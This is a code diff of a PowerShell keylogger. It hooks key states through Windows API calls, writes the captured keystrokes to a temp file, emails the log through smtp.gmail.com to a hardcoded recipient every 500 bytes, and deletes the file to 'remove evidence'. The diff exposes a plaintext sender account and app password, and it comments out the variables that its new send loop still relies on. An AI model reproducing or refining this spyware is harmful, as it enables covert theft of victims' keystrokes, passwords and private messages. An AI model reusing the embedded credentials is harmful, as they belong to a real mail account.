@@ -1,19 +1,19 @@
 # set config for email
-$From = "injectionkeystroke@gmail.com"
-$To = "maklo119@hhu.de"
-$Subject = "Log exfil from $($env:computername) User:$($env:UserName)"
-$Password = "wxmukckmhuetdmvt" | ConvertTo-SecureString -AsPlainText -Force
-$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
+#$From = "injectionkeystroke@gmail.com"
+#$To = "maklo119@hhu.de"
+#$Subject = "Log exfil from $($env:computername) User:$($env:UserName)"
+#$Password = "wxmukckmhuetdmvt" | ConvertTo-SecureString -AsPlainText -Force
+#$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
 
 function Logger($logFile="$env:temp/a.log") {
 
   #check if logger needs to create file
   if (Test-Path $logFile) {
     # Dateiinhalt auslesen
-    $content = Get-Content -Path $logFile
-    # Send mail
-    Send-MailMessage -From $From -To $To -Subject $Subject -Body ($content -join "`r`n") -SmtpServer "smtp.gmail.com" -port 587 -Credential $Credential -UseSsl
-    # Remove evidence
+    #$content = Get-Content -Path $logFile
+    ## Send mail
+    #Send-MailMessage -From $From -To $To -Subject $Subject -Body ($content -join "`r`n") -SmtpServer "smtp.gmail.com" -port 587 -Credential $Credential -UseSsl
+    ## Remove evidence
     Remove-Item $logFile -Force
   }
 
@@ -38,28 +38,55 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   # attempt to log keystrokes
   try {
+    # store prev Key to maybe delete if backspace is found
     while ($true) {
       Start-Sleep -Milliseconds 10
+      #need variable to store if ctrl is presed, because it is represented with multiple ascii values
+      $CTRL_First = $false;
       #iterate through all keys to see if they are pressed
       for ($ascii = 9; $ascii -le 254; $ascii++) {
         #get key state
         $keystate = $API::GetAsyncKeyState($ascii)
         # check if key is pressed
         if ($keystate -eq -32767) {
-          $null = [console]::CapsLock
-          # map virtual key
-          $mapKey = $API::MapVirtualKey($ascii, 3)
-          # get keyboard state and create stringbuilder
-          $keyboardState = New-Object Byte[] 256
-          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
-          $loggedchar = New-Object -TypeName System.Text.StringBuilder
-
-          # translate virtual key
-          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
-            # add logged key to file
-            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
+          if ($ascii -eq 8) { #not working
+            "|BACK|" | Out-File -FilePath $logFile -Append
+          }
+          elseif ($ascii -eq 9) {
+            "|TAB|" | Out-File -FilePath $logFile -Append -NoNewline
+          }
+          elseif ($ascii -eq 27) {
+            "|ESC|" | Out-File -FilePath $logFile -Append
+          }
+          elseif ($ascii -eq 17) {
+            $CTRL_First = $true;
+          }
+          elseif ($CTRL_First -eq $true -and $ascii -eq 162) {
+            $CTRL_First = $false;
+            "|CTRL|" | Out-File -FilePath $logFile -Append
+          }
+          else 
+          {
+            $null = [console]::CapsLock
+            # map virtual key
+            $mapKey = $API::MapVirtualKey($ascii, 3)
+            # get keyboard state and create stringbuilder
+            $keyboardState = New-Object Byte[] 256
+            $null = $API::GetKeyboardState($keyboardState)
+            $loggedchar = New-Object -TypeName System.Text.StringBuilder
+          
+            # translate virtual key
+            if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
+              # add logged key to file
+              [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
+            }
           }
         }
+      }
+      #check if the file reached size and send if so
+      if ((Get-Item -Path $logFile).Length -ge 500) {
+        Send-MailMessage -From $From -To $To -Subject $Subject -Body (Get-Content -Path $logFile) -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
+        Clear-Content -Path $logFile
       }
     }
   }
@@ -67,10 +94,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   # send logs if code fails
   finally {
     notepad $logFile
-    # Dateiinhalt auslesen
-    $content = Get-Content -Path $logFile
     # Send mail
-    Send-MailMessage -From $From -To $To -Subject $Subject -Body $content -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
+    Send-MailMessage -From $From -To $To -Subject $Subject -Body (Get-Content -Path $logFile) -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
     # Remove evidence
     Remove-Item $logFile -Force
   }
